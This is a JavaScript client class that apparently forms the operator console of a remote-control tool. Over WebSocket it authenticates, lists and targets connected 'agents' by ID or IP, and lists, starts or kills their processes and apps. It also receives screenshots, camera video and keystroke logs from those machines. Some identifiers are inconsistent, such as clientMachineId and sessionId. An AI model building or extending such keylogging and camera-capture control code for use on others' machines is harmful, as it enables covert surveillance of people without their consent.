import { CONFIG } from './config.js';

export class Gateway{
    /**
     * @param {Object} callbacks
     * @param {Function} callbacks.onConnected
     * @param {Function} callbacks.onDisconnected
     * @param {Function} callbacks.onMessage
     * @param {Function} callbacks.onError 
     * @param {Function} callbacks.onAuthSuccess 
     * @param {Function} callbacks.onAgentListUpdate
     * @param {Function} callbacks.onScreenshot     
     * @param {Function} callbacks.onCamera        
     * @param {Function} callbacks.onKeylog         
     * @param {Function} callbacks.onMessage
     */

    constructor(callbacks = {}) {
        this.ws = null;
        this.callbacks = callbacks;
        this.isAuthenticated = false;
        this.machineId = this._getMachineId();
        this.targetId = 'ALL';

        this.ui = window.ui || { log: console.log, renderList: console.table };

        this.agentsList = [];
    }

    findAgentId(input) {
        if (input === 'ALL') return 'ALL';
        
        const agent = this.agentsList.find(a => 
            a.id === input || 
            a.ip === input || 
            a.machineId === input
        );

        return agent ? agent.id : null;
    }

    _getMachineId() {
        let id = localStorage.getItem(CONFIG.LOCAL_STORAGE_ID_KEY);
        if (!id) {
            id = 'CLI-' + Math.random().toString(36).substring(2, 10).toUpperCase();
            localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
        }
        //this.ui.log('System', `Machine Id:  ${id}`, 'info');
        return id;
    }

    /**
     * @param {string} ip 
     * @param {number} port
     */

    connect(ip, port = CONFIG.SERVER_PORT) {
        if (this.ws) {
            this.ws.close();
        }

        const url = `wss://${ip}:${port}`;
        console.log(`[Gateway] Connecting to ${url}...`);

        this.ws = new WebSocket(url);

        this.ws.onopen = () => {
            console.log(`[Network] Socket opened.`)
            this.send(
                CONFIG.CMD.AUTH, {
                    pass: CONFIG.AUTH_HASH,
                    role: 'CLIENT',
                    machineId: this.machineId
                }
            );
        };

        this.ws.onmessage = (event) => this._handleInternalMessage(event);
        
        this.ws.onclose = () => {
            this.isAuthenticated = false;
            if (this.callbacks.onDisconnected) this.callbacks.onDisconnected();
        };

        this.ws.onerror = (err) => {
            if (this.callbacks.onError) {
                this.callbacks.onError(err);
            }
        };
    }

    disconnect() {
        if (this.ws) this.ws.close();
    }

    authenticate() {
        this.send(CONFIG.CMD.AUTH, {
            pass: CONFIG.AUTH_HASH,
            role: 'CLIENT',
            machineId: this.clientMachineId
,        });
    }

    /**
     * @param {string} type 
     * @param {any} data 
     * @param {string|null} specificTarget // if null -> targetId
     */

    send(type, data, specificTarget = null) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot send: Socket not open.`);
            return;
        }
        //const from = this.clientConnectionId;
        // if (type === CONFIG.CMD.AUTH) {
        //     const packet = JSON.stringify({ type, data });
        //     this.ws.send(packet);
        // } else {
        //     if (!from) {
        //         console.error("[Gateway] Cannot send. Not authenticated (missing Session ID).");
        //         return;
        //     }

        //     const packet = JSON.stringify({ type, data, to, from });
        //     this.ws.send(packet);
        // }

        if (type === CONFIG.CMD.AUTH) {
            this.ws.send(JSON.stringify({type, data}));
            return;
        }

        const payload = {
            type: type,
            data: data,
            from: this.sessionId,
            to: specificTarget || this.targetId
        }

        this.ws.send(JSON.stringify(payload));
    }

    setTarget(input) {
        const realId = this.findAgentId(input);
        
        if (realId) {
            this.targetId = realId;
            console.log(`[Gateway] Target locked: ${realId} (Matched: ${input})`);
        } else {
            console.warn(`[Gateway] Could not find agent with Name/IP/ID: ${input}`);
            console.log("Available Agents:", this.agentsList);
        }
    }

    refreshAgents() {
        this.send(CONFIG.CMD.GET_AGENTS, {});
    }

    fetchProcessList() {
        this.send(CONFIG.CMD.PROC_LIST, "");
    }

    startProcess(id) {
        this.send(CONFIG.CMD.PROC_START, String(id));
    }

    killProcess(id) {
        this.send(CONFIG.CMD.PROC_KILL, String(id));
    }

    fetchAppList() {
        this.send(CONFIG.CMD.APP_LIST, "");
    }

    startApp(id) {
        this.send(CONFIG.CMD.APP_START, String(id));
    }

    killApp(id) {
        this.send(CONFIG.CMD.APP_KILL, String(id));
    }

    _handleInternalMessage(event) {
        try {
            let msg;
            try { msg = JSON.parse(event.data); } 
            catch { msg = { type: 'raw', data: event.data }; }
            const senderId = msg.from;

            switch (msg.type) {
                case CONFIG.CMD.AUTH:
                    if (msg.data && msg.data.status === 'ok') {
                        this.isAuthenticated = true;
                        this.clientConnectionId = msg.data.sessionId;
                        this.ui.log('Auth', `Success! Connected as: ${this.clientConnectionId}`, 'info');
                        if (this.callbacks.onAuthSuccess) this.callbacks.onAuthSuccess();
                        this.refreshAgents();
                    }
                    else {
                        console.error(`[Gateway] Auth Failed`);
                    }
                    break;
                case CONFIG.CMD.GET_AGENTS:
                    this.agentsList = msg.data; 
                    console.table(this.agentsList);

                    if (this.callbacks.onAgentListUpdate) {
                        this.callbacks.onAgentListUpdate(msg.data) // array [agent, agent]
                    } 
                    break;
                case CONFIG.CMD.PROC_LIST:
                    this.ui.renderList('Process List', msg.data);
                    break;
                case CONFIG.CMD.APP_LIST:
                    this.ui.renderList('Application List', msg.data);
                    break;
                case CONFIG.CMD.PROC_START:
                case CONFIG.CMD.PROC_KILL:
                case CONFIG.CMD.APP_START:
                case CONFIG.CMD.APP_KILL:
                    this._handleCommandResult(msg.type, msg.data);
                    break;
                case CONFIG.CMD.SCREENSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        console.log(`[Gateway] Screenshot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    }
                    break;
                case CONFIG.CMD.CAM_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        console.log(`[Gateway] Camera video received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    }
                    break;
                case CONFIG.CMD.START_KEYLOG:
                    if (this.callbacks.onKeylog) {
                        this.callbacks.onKeylog(msg.data, senderId);
                    }
                    break;
                case CONFIG.CMD.ERROR:
                    console.error("[Server Error]", msg.data);
                    this.ui.log('Error', typeof msg.data === 'string' ? msg.data : msg.data.msg);
                    break;
                default:
                    this.ui.log('Server', JSON.stringify(msg.data));
                    if(this.callbacks.onMessage) {
                    this.callbacks.onMessage(msg);
            }
            }

        } catch (e) {
            console.error('[Gateway] Error handling message: ', e);
        }
    }

    _handleCommandResult(type, data) {
        const isSuccess = data.status === 'ok';
        const logMsg = `${type}: ${data.msg} (ID: ${data.id || 'N/A'})`;

        if (isSuccess) {
            console.log(`[Success] ${logMsg}`);
            this.ui.log('System', data.msg);

            if (type.includes("APP")) this.fetchAppList();
            if (type.includes("PROC")) this.fetchProcessList();
        } else {
            console.warn(`[Failed] ${logMsg}`);
            this.ui.log('Error', data.msg);
        }
    }
}